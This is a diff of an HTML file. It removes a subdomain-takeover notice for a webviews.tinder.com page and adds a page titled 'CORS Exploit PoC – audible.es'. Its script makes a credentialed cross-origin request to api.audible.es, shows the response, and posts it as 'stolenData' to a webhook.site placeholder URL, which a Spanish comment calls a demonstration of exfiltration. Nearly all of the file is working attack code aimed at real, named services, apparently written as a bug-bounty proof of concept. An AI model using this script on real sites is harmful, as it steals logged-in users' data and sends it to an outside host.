@@ -1,11 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>webviews.tinder.com</title>
-</head>
-<body>
-  <h1 style="text-align:center; margin-top: 20%;">✅ Subdomain Claimed</h1>
-  <p style="text-align:center;">This page is now under control.</p>
-</body>
+<html>
+  <body>
+    <h1>🔥 CORS Exploit PoC – audible.es</h1>
+    <pre id="output">Cargando...</pre>
+    <script>
+      fetch("https://api.audible.es/1.0/catalog/products", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("output").textContent = data;
+        // También puedes enviarlo a un webhook externo para demostrar exfiltración:
+        fetch("https://webhook.site/TU_UUID", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ stolenData: data })
+        });
+      })
+      .catch(err => {
+        document.getElementById("output").textContent = "Error: " + err;
+      });
+    </script>
+  </body>
 </html>
